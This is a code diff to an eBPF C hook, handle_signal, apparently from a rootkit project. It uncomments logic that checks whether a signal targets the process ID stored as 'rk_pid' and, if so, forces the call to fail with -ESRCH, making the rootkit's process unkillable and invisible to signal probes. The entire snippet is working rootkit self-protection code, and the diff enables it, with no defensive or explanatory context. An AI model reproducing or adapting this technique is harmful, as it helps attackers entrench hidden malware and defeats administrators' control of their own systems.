@@ -15,7 +15,7 @@ static __attribute__((always_inline)) int handle_signal(struct pt_regs *ctx)
     u64 rk_pid;
     LOAD_CONSTANT("rk_pid", rk_pid);
 
-   /* struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);
+    struct pt_regs *rctx = (struct pt_regs *)PT_REGS_PARM1(ctx);
 
     int pid;
     bpf_probe_read(&pid, sizeof(pid), &PT_REGS_PARM1(rctx));
@@ -23,7 +23,7 @@ static __attribute__((always_inline)) int handle_signal(struct pt_regs *ctx)
     if (pid == rk_pid)
     {
         bpf_override_return(ctx, -ESRCH);
-    }*/
+    }
 
     return 0;
 }
